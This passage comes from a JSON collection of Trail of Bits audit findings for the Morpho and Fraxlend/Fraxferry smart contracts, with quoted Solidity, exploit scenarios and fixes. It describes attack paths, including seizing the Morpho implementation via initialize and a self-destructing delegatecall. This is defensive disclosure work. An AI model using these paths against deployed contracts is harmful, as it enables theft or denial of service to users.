supplyBalanceInOf[_poolTokenAddress][msg.sender].inP2P ); Figure 2.3: The emission of the Withdrawn event in the _safeWithdrawLogic function A similar issue is present in the _safeRepayLogic functions Repaid event. Recommendations Short term, add the relevant addresses to the Withdrawn and Repaid events. Long term, review all of the events emitted by the system to ensure that they emit sucient information.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing access control check in withdrawLogic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "The PositionsManager contracts withdrawLogic function does not perform any access control checks. In practice, this issue is not exploitable, as all interactions with this contract will be through delegatecalls with a hard-coded msg.sender sent from the main Morpho contract. However, if this code is ever reused or if the architecture of the system is ever modied, this guarantee may no longer hold, and users without the proper access may be able to withdraw funds. /// @dev Implements withdraw logic with security checks. /// @param _poolTokenAddress The address of the market the user wants to interact with. /// @param _amount The amount of token (in underlying). /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external { Figure 3.1: The withdrawLogic function, which takes a supplier and whose comments note that it performs security checks Recommendations Short term, add a check to the withdrawLogic function to ensure that it withdraws funds only from the msg.sender. Long term, implement security checks consistently throughout the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Lack of zero address checks in setter functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. A mistake like this could initially go unnoticed because a delegatecall to an address without code will return success. /// @notice Sets the `positionsManager`. /// @param _positionsManager The new `positionsManager`. function setPositionsManager(IPositionsManager _positionsManager) external onlyOwner { positionsManager = _positionsManager; emit PositionsManagerSet(address(_positionsManager)); } Figure 4.1: An important address setter in MorphoGovernance Exploit Scenario Alice and Bob control a multisignature wallet that is the owner of a deployed Morpho contract. They decide to set _positionsManager to a newly upgraded contract but, while invoking setPositionsManager, they mistakenly omit the address. As a result, _positionsManager is set to the zero address, resulting in undened behavior. Recommendations Short term, add zero-value checks to all important address setters to ensure that owners cannot accidentally set addresses to incorrect values, misconguring the system. Specically, add zero-value checks to the setPositionsManager, setRewardsManager, setInterestRates, setTreasuryVault, and setIncentivesVault functions, as well as the _cETH and _cWeth parameters of the initialize function in the MorphoGovernance contract. Long term, incorporate Slither into a continuous integration pipeline, which will continuously warn developers when functions do not have checks for zero values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Risky use of toggle functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "The codebase uses a toggle function, togglePauseStatus, to pause and unpause a market. This function is error-prone because setting a pause status on a market depends on the markets current state. Multiple uncoordinated pauses could result in a failure to pause a market in the event of an incident. /// @notice Toggles the pause status on a specific market in case of emergency. /// @param _poolTokenAddress The address of the market to pause/unpause. function togglePauseStatus(address _poolTokenAddress) external onlyOwner isMarketCreated(_poolTokenAddress) { } Types.MarketStatus storage marketStatus_ = marketStatus[_poolTokenAddress]; bool newPauseStatus = !marketStatus_.isPaused; marketStatus_.isPaused = newPauseStatus; emit PauseStatusChanged(_poolTokenAddress, newPauseStatus); Figure 5.1: The togglePauseStatus method in MorphoGovernance This issue also applies to togglePartialPauseStatus, toggleP2P, and toggleCompRewardsActivation in MorphoGovernance and to togglePauseStatus in IncentivesVault. Exploit Scenario All signers of a 4-of-9 multisignature wallet that owns a Morpho contract notice an ongoing attack that is draining user funds from the protocol. Two groups of four signers hurry to independently call togglePauseStatus, resulting in a failure to pause the system and leading to the further loss of funds. Recommendations Short term, replace the toggle functions with ones that explicitly set the pause status to true or false. Long term, carefully review the incident response plan and ensure that it leaves as little room for mistakes as possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Anyone can destroy Morphos implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "An incorrect access control on the initialize function for Morphos implementation contract allows anyone to destroy the contract. Morpho uses the delegatecall proxy pattern for upgradeability: abstract contract MorphoStorage is OwnableUpgradeable, ReentrancyGuardUpgradeable { Figure 6.1: contracts/compound/MorphoStorage.sol#L16 With this pattern, a proxy contract is deployed and executes a delegatecall to the implementation contract for certain operations. Users are expected to interact with the system through this proxy. However, anyone can also directly call Morphos implementation contract. Despite the use of the proxy pattern, the implementation contract itself also has delegatecall capacities. For example, when called in the updateP2PIndexes function, setReserveFactor executes a delegatecall on user-provided addresses: function setReserveFactor(address _poolTokenAddress, uint16 _newReserveFactor) external onlyOwner isMarketCreated(_poolTokenAddress) { if (_newReserveFactor > MAX_BASIS_POINTS) revert ExceedsMaxBasisPoints(); updateP2PIndexes(_poolTokenAddress); Figure 6.2: contracts/compound/MorphoGovernance.sol#L203-L209 function updateP2PIndexes(address _poolTokenAddress) public { address(interestRatesManager).functionDelegateCall( abi.encodeWithSelector( interestRatesManager.updateP2PIndexes.selector, _poolTokenAddress ) ); } Figure 6.3: contracts/compound/MorphoUtils.sol#L119-L126 These functions are protected by the onlyOwner modier; however, the systems owner is set by the initialize function, which is callable by anyone: function initialize( IPositionsManager _positionsManager, IInterestRatesManager _interestRatesManager, IComptroller _comptroller, Types.MaxGasForMatching memory _defaultMaxGasForMatching, uint256 _dustThreshold, uint256 _maxSortedUsers, address _cEth, address _wEth ) external initializer { __ReentrancyGuard_init(); __Ownable_init(); Figure 6.4: contracts/compound/MorphoGovernance.sol#L114-L125 As a result, anyone can call Morpho.initialize to become the owner of the implementation and execute any delegatecall from the implementation, including to a contract containing a selfdestruct. Doing so will cause the proxy to point to a contract that has been destroyed. This issue is also present in PositionsManagerForAave. Exploit Scenario The system is deployed. Eve calls Morpho.initialize on the implementation and then calls setReserveFactor, triggering a delegatecall to an attacker-controlled contract that self-destructs. As a result, the system stops working. Recommendations Short term, add a constructor in MorphoStorage and PositionsManagerForAaveStorage that will set an is_implementation variable to true and check that this variable is false before executing any critical operation (such as initialize, delegatecall, and selfdestruct). By setting this variable in the constructor, it will be set only in the implementation and not in the proxy. Long term, carefully review the pitfalls of using the delegatecall proxy pattern. References  Breaking Aave Upgradeability",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Lack of return value checks during token transfers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "In certain parts of the codebase, contracts that execute transfers of the Morpho token do not check the values returned from those transfers. The development of the Morpho token was not yet complete at the time of the audit, so we were unable to review the code specic to the Morpho token. Some tokens that are not ERC20 compliant return false instead of reverting, so failure to check such return values could result in undened behavior, including the loss of funds. If the Morpho token adheres to ERC20 standards, then this issue may not pose a risk; however, due to the lack of return value checks, the possibility of undened behavior cannot be eliminated. function transferMorphoTokensToDao(uint256 _amount) external onlyOwner { morphoToken.transfer(morphoDao, _amount); emit MorphoTokensTransferred(_amount); } Figure 7.1: The transerMorphoTokensToDao method in IncentivesVault Exploit Scenario The Morpho token code is completed and deployed alongside the other Morpho system components. It is implemented in such a way that it returns false instead of reverting when transfers fail, leading to undened behavior. Recommendations Short term, consider using a safeTransfer library for all token transfers. Long term, review the token integration checklist and check all the components of the system to ensure that they interact with tokens safely.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Risk of loss of precision in division operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "A common pattern in the codebase is to divide a users debt by the total supply of a token; a loss of precision in these division operations could occur, which means that the supply delta would not account for the entire matched delta amount. The impact of this potential loss of precision requires further investigation. For example, the borrowLogic method uses this pattern: toWithdraw += matchedDelta; remainingToBorrow -= matchedDelta; delta.p2pSupplyDelta -= matchedDelta.div(poolSupplyIndex); emit P2PSupplyDeltaUpdated(_poolTokenAddress, delta.p2pSupplyDelta); Figure 8.1: Part of the borrowLogic() method Here, if matchedDelta is not a multiple of poolSupplyIndex, the remainder would not be taken into account. In an extreme case, if matchedDelta is smaller than poolSupplyIndex, the result of the division operation would be zero. An attacker could exploit this loss of precision to extract small amounts of underlying tokens sitting in the Morpho contract. Exploit Scenario Bob transfers some Dai to the Morpho contract by mistake. Eve sees this transfer, deposits some collateral, and then borrows an amount of Dai from Morpho small enough that it does not aect Eve's debt. Eve withdraws her deposited collateral and walks out with Bobs Dai. Further investigation into this exploit scenario is required. Recommendations Short term, add checks to validate input data to prevent precision issues in division operations. Long term, review all the arithmetic that is vulnerable to rounding issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The owner of a contract that inherits from the FraxlendPairCore contract can be changed through a call to the transferOwnership function. This function internally calls the _setOwner function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _setOwner(newOwner); } function _setOwner ( address newOwner ) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 1.1: OpenZeppelins OwnableUpgradeable contract Exploit Scenario Alice, a Frax Finance administrator, invokes the transferOwnership function to change the address of an existing contracts owner but mistakenly submits the wrong address. As a result, ownership of the contract is permanently lost. Recommendations Short term, implement ownership transfer operations that are executed in a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing checks of constructor/initialization parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "In the Fraxlend protocols constructor function, various settings are congured; however, two of the conguration parameters do not have checks to validate the values that they are set to. First, the _liquidationFee parameter does not have an upper limit check: constructor ( bytes memory _configData, bytes memory _immutables, uint256 _maxLTV , uint256 _liquidationFee , uint256 _maturityDate , uint256 _penaltyRate , bool _isBorrowerWhitelistActive , bool _isLenderWhitelistActive ) { [...] cleanLiquidationFee = _liquidationFee; dirtyLiquidationFee = (_liquidationFee * 90000 ) / LIQ_PRECISION; // 90 % of clean fee Figure 2.1: The constructor functions parameters in FraxlendPairCore.sol#L193-L194 Second, the Fraxlend system can work with one or two oracles; however, there is no check to ensure that at least one oracle is set: constructor ( bytes memory _configData, bytes memory _immutables, uint256 _maxLTV , uint256 _liquidationFee , uint256 _maturityDate , uint256 _penaltyRate , bool _isBorrowerWhitelistActive , bool _isLenderWhitelistActive ) { // [...] // Oracle Settings { IFraxlendWhitelist _fraxlendWhitelist = IFraxlendWhitelist(FRAXLEND_WHITELIST_ADDRESS); // Check that oracles are on the whitelist if (_oracleMultiply != address ( 0 ) && !_fraxlendWhitelist.oracleContractWhitelist(_oracleMultiply)) { revert NotOnWhitelist(_oracleMultiply); } if (_oracleDivide != address ( 0 ) && !_fraxlendWhitelist.oracleContractWhitelist(_oracleDivide)) { revert NotOnWhitelist(_oracleDivide); } // Write oracleData to storage oracleMultiply = _oracleMultiply; oracleDivide = _oracleDivide; oracleNormalization = _oracleNormalization; Figure 2.2: The constructor functions body in FraxlendPairCore.sol#L201-L214 Exploit Scenario Bob deploys a custom pair with a miscongured _configData argument in which no oracle is set. As a consequence, the exchange rate is incorrect. Recommendations Short term, add an upper limit check for the _liquidationFee parameter, and add a check for the _configData parameter to ensure that at least one oracle is set. The checks can be added in either the FraxlendPairCore contract or the FraxlendPairDeployer contract. Long term, add appropriate requirements to values that users set to decrease the likelihood of user error.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Incorrect application of penalty fee rate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "A Fraxlend pair can have a maturity date, after which a penalty rate is applied to the interest to be paid by the borrowers. However, the penalty rate is also applied to the amount of time immediately before the maturity date. As shown in gure 3.1, the _addInterest function checks whether a pair is past maturity. If it is, the function sets the new rate (the _newRate parameter) to the penalty rate (the penaltyRate parameter) and then uses it to calculate the matured interest. The function should apply the penalty rate only to the time between the maturity date and the current time; however, it also applies the penalty rate to the time between the last interest accrual ( _deltaTime ) and the maturity date, which should be subject only to the normal interest rate. function _addInterest () // [...] uint256 _deltaTime = block.timestamp - _currentRateInfo.lastTimestamp; // [...] if (_isPastMaturity()) { _newRate = uint64 (penaltyRate); } else { // [...] // Effects: bookkeeping _currentRateInfo.ratePerSec = _newRate; _currentRateInfo.lastTimestamp = uint64 ( block.timestamp ); _currentRateInfo.lastBlock = uint64 ( block.number ); // Calculate interest accrued _interestEarned = (_deltaTime * _totalBorrow.amount * _currentRateInfo.ratePerSec) / 1e18; Figure 3.1: The _addInterest function in FraxlendPairCore.sol#L406-L494 Exploit Scenario A Fraxlend pairs maturity date is 100, the delta time (the last time interest accrued) is 90, and the current time is 105. Alice decides to repay her debt. The _addInterest function is executed, and the penalty rate is also applied to the interest accrual and the maturity date. As a result, Alice owes more in interest than she should. Recommendations Short term, modify the associated code so that if the _isPastMaturity branch is taken and the _currentRateInfo.lastTimestamp value is less than maturityDate value, the penalty interest rate is applied only for the amount of time after the maturity date. Long term, identify edge cases that could occur in the interest accrual process and implement unit tests and fuzz tests to validate them.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Improper validation of Chainlink data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The current validation of the values returned by Chainlinks latestRoundData function could result in the use of stale data. The latestRoundData function returns the following values: the answer , the roundId (which represents the current round), the answeredInRound value (which corresponds to the round in which the answer was computed), and the updatedAt value (which is the timestamp of when the round was updated). An updatedAt value of zero means that the round is not complete and should not be used. An answeredInRound value that is less than the roundId could indicate stale data. However, the _updateExchangeRate function does not check for these conditions. function _updateExchangeRate () internal returns ( uint256 _exchangeRate ) { // [...] uint256 _price = uint256 (1e36); if (oracleMultiply != address ( 0 )) { (, int256 _answer , , , ) = AggregatorV3Interface(oracleMultiply).latestRoundData(); if (_answer <= 0 ) { revert OracleLTEZero(oracleMultiply); } _price = _price * uint256 (_answer); } if (oracleDivide != address ( 0 )) { (, int256 _answer , , , ) = AggregatorV3Interface(oracleDivide).latestRoundData(); if (_answer <= 0 ) { revert OracleLTEZero(oracleDivide); } _price = _price / uint256 (_answer); } // [...] } Figure 4.1: The _updateExchangeRate function in FraxlendPairCore.sol#L513-L544 Exploit Scenario Chainlink is not updated correctly in the current round, and Eve, who should be liquidated with the real collateral asset price, is not liquidated because the price reported is outdated and is higher than it is in reality. Recommendations Short term, have _updateExchangeRate perform the following sanity check: require(updatedAt != 0 && answeredInRound == roundId) . This check will ensure that the round has nished and that the pricing data is from the current round. Long term, when integrating with third-party protocols, make sure to accurately read their documentation and implement the appropriate sanity checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Risk of oracle outages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Fraxlend protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA/USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which will pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundId . Therefore, the Frax Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. Recommendations Short term, implement an o-chain monitoring solution that checks for the following conditions and issues alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Unapproved lenders could receive fTokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "A Fraxlend custom pair can include a list of approved lenders; these are the only lenders who can deposit the underlying asset into the given pair and receive the corresponding fTokens. However, the system does not perform checks when users transfer fTokens; as a result, approved lenders could send fTokens to unapproved addresses. Although unapproved addresses can only redeem fTokens sent to themmeaning this issue is not security-criticalthe ability for approved lenders to send fTokens to unapproved addresses conicts with the currently documented behavior. function deposit ( uint256 _amount , address _receiver ) external nonReentrant isNotPastMaturity whenNotPaused approvedLender(_receiver) returns ( uint256 _sharesReceived ) {...} Figure 6.1: The deposit function in FraxlendPairCore.sol#L587-L594 Exploit Scenario Bob, an approved lender, deposits 100 asset tokens and receives 90 fTokens. He then sends the fTokens to an unapproved address, causing other users to worry about the state of the protocol. Recommendations Short term, override the _beforeTokenTransfer function by applying the approvedLender modier to it. Alternatively, document the ability for approved lenders to send fTokens to unapproved addresses. Long term, when applying access controls to token owners, make sure to evaluate all the possible ways in which a token can be transferred and document the expected behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. FraxlendPairDeployer cannot deploy contracts of fewer than 13,000 bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The FraxlendPairDeployer contract, which is used to deploy new pairs, does not allow contracts that contain less than 13,000 bytes of code to be deployed. To deploy new pairs, users call the deploy or deployCustom function, which then internally calls _deployFirst . This function uses the create2 opcode to create a contract for the pair by concatenating the bytecode stored in contractAddress1 and contractAddress2 . The setCreationCode function, which uses solmates SSTORE2 library to store the bytecode for use by create2 , splits the bytecode into two separate contracts ( contractAddress1 and contractAddress2 ) if the _creationCode size is greater than 13,000. function setCreationCode ( bytes calldata _creationCode) external onlyOwner { bytes memory _firstHalf = BytesLib.slice(_creationCode, 0 , 13000 ); contractAddress1 = SSTORE2.write(_firstHalf); if (_creationCode.length > 13000 ) { bytes memory _secondHalf = BytesLib.slice(_creationCode, 13000 , _creationCode.length - 13000 ); contractAddress2 = SSTORE2.write(_secondHalf); } } Figure 7.1: The setCreationCode function in FraxlendPairDeployer.sol#L173-L180 The rst problem is that if the _creationCode size is less than 13,000, BytesLib.slice will revert with the slice_outOfBounds error, as shown in gure 7.2. function slice ( bytes memory _bytes, uint256 _start , uint256 _length ) internal pure returns ( bytes memory ) { require (_length + 31 >= _length, \"slice_overflow\" ); require (_bytes.length >= _start + _length, \"slice_outOfBounds\" ); Figure 7.2: The BytesLib.slice function from the solidity-bytes-utils library Assuming that the rst problem does not exist, another problem arises from the use of SSTORE2.read in the _deployFirst function (gure 7.3). If the creation code was less than 13,000 bytes, contractAddress2 would be set to address(0) . This would cause the SSTORE2.read functions pointer.code.length - DATA_OFFSET computation, shown in gure 7.4, to underow, causing the SSTORE2.read operation to panic. function _deployFirst ( // [...] ) private returns ( address _pairAddress ) { { // [...] bytes memory _creationCode = BytesLib.concat( SSTORE2.read(contractAddress1), SSTORE2.read(contractAddress2) ); Figure 7.3: The _deployFirst function in FraxlendPairDeployer.sol#L212-L231 uint256 internal constant DATA_OFFSET = 1 ; function read ( address pointer ) internal view returns ( bytes memory ) { return readBytecode(pointer, DATA_OFFSET, pointer.code.length - DATA_OFFSET ); } Figure 7.4: The SSTORE2.read function from the solmate library Exploit Scenario Bob, the FraxlendPairDeployer contracts owner, wants to set the creation code to be a contract with fewer than 13,000 bytes. When he calls setCreationCode , it reverts. Recommendations Short term, make the following changes:   In setCreationCode , in the line that sets the _firstHalf variable, replace 13000 in the third argument of BytesLib.slice with min(13000, _creationCode.length) . In _deployFirst , add a check to ensure that the SSTORE2.read(contractAddress2) operation executes only if contractAddress2 is not address(0) . Alternatively, document the fact that it is not possible to deploy contracts with fewer than 13,000 bytes. Long term, improve the projects unit tests and fuzz tests to check that the functions behave as expected and cannot unexpectedly revert.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. setCreationCode fails to overwrite _secondHalf slice if updated code size is less than 13,000 bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The setCreationCode function permits the owner of FraxlendPairDeployer to set the bytecode that will be used to create contracts for newly deployed pairs. If the _creationCode size is greater than 13,000 bytes, it will be split into two separate contracts ( contractAddress1 and contractAddress2 ). However (assuming that TOB-FXLEND-7 were xed), if a FraxlendPairDeployer owner were to change the creation code from one of greater than 13,000 bytes to one of fewer than 13,000 bytes, contractAddress2 would not be reset to address(0) ; therefore, contractAddress2 would still contain the second half of the previous creation code. function setCreationCode ( bytes calldata _creationCode) external onlyOwner { bytes memory _firstHalf = BytesLib.slice(_creationCode, 0 , 13000 ); contractAddress1 = SSTORE2.write(_firstHalf); if (_creationCode.length > 13000 ) { bytes memory _secondHalf = BytesLib.slice(_creationCode, 13000 , _creationCode.length - 13000 ); contractAddress2 = SSTORE2.write(_secondHalf); } } Figure 8.1: The setCreationCode function in FraxlendPairDeployer.sol#L173-L180 Exploit Scenario Bob, FraxlendPairDeployer s owner, changes the creation code from one of more than 13,000 bytes to one of less than 13,000 bytes. As a result, deploy and deployCustom deploy contracts with unexpected bytecode. Recommendations Short term, modify the setCreationCode function so that it sets contractAddress2 to address(0) at the beginning of the function . Long term, improve the projects unit tests and fuzz tests to check that the functions behave as expected and cannot unexpectedly revert.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Missing checks in setter functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The setFee and setMinWaitPeriods functions do not have appropriate checks. First, the setFee function does not have an upper limit, which means that the Fraxferry owner can set enormous fees. Second, the setMinWaitPeriods function does not require the new value to be at least one hour. A minimum waiting time of less than one hour would invalidate important safety assumptions. For example, in the event of a reorganization on the source chain, the minimum one-hour waiting time ensures that only transactions after the reorganization are ferried (as described in the code comment in gure 9.1). ** - Reorgs on the source chain. Avoided, by only returning the transactions on the source chain that are at least one hour old. ** - Rollbacks of optimistic rollups. Avoided by running a node. ** - Operators do not have enough time to pause the chain after a fake proposal. Avoided by requiring a minimal amount of time between sending the proposal and executing it. // [...] function setFee ( uint _FEE ) external isOwner { FEE=_FEE; emit SetFee(_FEE); } function setMinWaitPeriods ( uint _MIN_WAIT_PERIOD_ADD , uint _MIN_WAIT_PERIOD_EXECUTE ) external isOwner { MIN_WAIT_PERIOD_ADD=_MIN_WAIT_PERIOD_ADD; MIN_WAIT_PERIOD_EXECUTE=_MIN_WAIT_PERIOD_EXECUTE; emit SetMinWaitPeriods(_MIN_WAIT_PERIOD_ADD, _MIN_WAIT_PERIOD_EXECUTE); } Figure 9.1: The setFee and setMinWaitPeriods functions in Fraxferry.sol#L226-L235 Exploit Scenario Bob, Fraxferry s owner, calls setMinWaitPeriods with a _MIN_WAIT_PERIOD_ADD value lower than 3,600 (one hour) , invalidating the waiting periods protection regarding chain reorganizations. Recommendations Short term, add an upper limit check to the setFee function; add a check to the setMinWaitPeriods function to ensure that _MIN_WAIT_PERIOD_ADD and _MIN_WAIT_PERIOD_EXECUTE are at least 3,600 (one hour). Long term, make sure that conguration variables can be set only to valid values.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Risk of invalid batches due to unsafe cast in depart function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The depart function performs an unsafe cast operation that could result in an invalid batch. Users who want to send tokens to a certain chain use the various embark* functions. These functions eventually call embarkWithRecipient , which adds the relevant transactions to the transactions array. function embarkWithRecipient ( uint amount , address recipient ) public notPaused { // [...] transactions.push(Transaction(recipient,amountAfterFee, uint32 ( block.timestamp ))); } Figure 10.1: The embarkWithRecipient function in Fraxferry.sol#L127-L135 At a certain point, the captain role calls depart with the start and end indices within transactions to specify the transactions inside of a batch. However, the depart function performs an unsafe cast operation when creating the new batch; because of this unsafe cast operation, an end value greater than 2 ** 64 would be cast to a value lower than the start value, breaking the invariant that end is greater than or equal to start . function depart ( uint start , uint end , bytes32 hash ) external notPaused isCaptain { require ((batches.length== 0 && start== 0 ) || (batches.length> 0 && start==batches[batches.length- 1 ].end+ 1 ), \"Wrong start\" ); require (end>=start, \"Wrong end\" ); batches.push(Batch( uint64 (start), uint64 (end), uint64 ( block.timestamp ), 0 , hash )); emit Depart(batches.length- 1 ,start,end, hash ); } Figure 10.2: The depart function in Fraxferry.sol#L155-L160 If the resulting incorrect batch is not disputed by the crew member roles, which would cause the system to enter a paused state, the rst ocer role will call disembark to actually execute the transactions on the target chain. However, the disembark functions third check, highlighted in gure 10.3, on the invalid transaction will fail, causing the transaction to revert and the system to stop working until the incorrect batch is removed with a call to removeBatches . function disembark (BatchData calldata batchData) external notPaused isFirstOfficer { Batch memory batch = batches[executeIndex++]; require (batch.status== 0 , \"Batch disputed\" ); require (batch.start==batchData.startTransactionNo, \"Wrong start\" ); require (batch.start+batchData.transactions.length- 1 ==batch.end, \"Wrong size\" ); require ( block.timestamp -batch.departureTime>=MIN_WAIT_PERIOD_EXECUTE, \"Too soon\" ); // [...] } Figure 10.3: The disembark function in Fraxferry.sol#L162-L178 Exploit Scenario Bob, Fraxferry s captain, calls depart with an end value greater than 2 ** 64 , which is cast to a value less than start . As a consequence, the system becomes unavailable either because the crew members called disputeBatch or because the disembark function reverts. Recommendations Short term, replace the unsafe cast operation in the depart function with a safe cast operation to ensure that the end >= start invariant holds. Long term, implement robust unit tests and fuzz tests to check that important invariants hold.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Transactions that were already executed can be canceled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The Fraxferry contracts owner can call the jettison or jettisonGroup functions to cancel a transaction or a series of transactions, respectively. However, these functions incorrectly use the executeIndex variable to determine whether the given transaction has already been executed. As a result, it is possible to cancel an already executed transaction. The problem is that executeIndex tracks executed batches, not executed transactions. Because a batch can contain more than one transaction, the check in the _jettison function (gure 11.1) does not work correctly. function _jettison ( uint index , bool cancel ) internal { require (index>=executeIndex, \"Transaction already executed\" ); cancelled[index]=cancel; emit Cancelled(index,cancel); } function jettison ( uint index , bool cancel ) external isOwner { _jettison(index,cancel); } function jettisonGroup ( uint [] calldata indexes, bool cancel ) external isOwner { for ( uint i = 0 ;i<indexes.length;++i) { _jettison(indexes[i],cancel); } } Figure 11.1: The _jettison , jettison , and jettisonGroup functions in Fraxferry.sol#L208-L222 Note that canceling a transaction that has already been executed does not cancel its eects (i.e., the tokens were already sent to the receiver). Exploit Scenario Two batches of 10 transactions are executed; executeIndex is now 2 . Bob, Fraxferry s owner, calls jettison with an index value of 13 to cancel one of these transactions. The call to jettison should revert, but it is executed correctly. The emitted Cancelled event shows that a transaction that had already been executed was canceled, confusing the o-chain monitoring system. Recommendations Short term, use a dierent index in the jettison and jettisonGroup functions to track executed transactions. Long term, implement robust unit tests and fuzz tests to check that important invariants hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Lack of contract existence check on low-level call ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "description": "The execute function includes a low-level call operation without a contract existence check; call operations return true even if the _to address is not a contract, so it is important to include contract existence checks alongside such operations. // Generic proxy function execute ( address _to , uint256 _value , bytes calldata _data) external isOwner returns ( bool , bytes memory ) { ( bool success , bytes memory result) = _to.call{value:_value}(_data); return (success, result); } Figure 12.1: The execute function in Fraxferry.sol#L274-L278 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 12.2: A snippet of the Solidity documentation detailing unexpected behavior related to call Exploit Scenario Bob, Fraxferry s owner, calls execute with _to set to an address that should be a contract; however, the contract was self-destructed. Even though the contract at this address no longer exists, the operation still succeeds. Recommendations Short term, implement a contract existence check before the call operation in the execute function. If the call operation is expected to send ETH to an externally owned address, ensure that the check is performed only if the _data.length is not zero. Long term, carefully review the Solidity documentation , especially the Warnings section.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Events could be improved ",
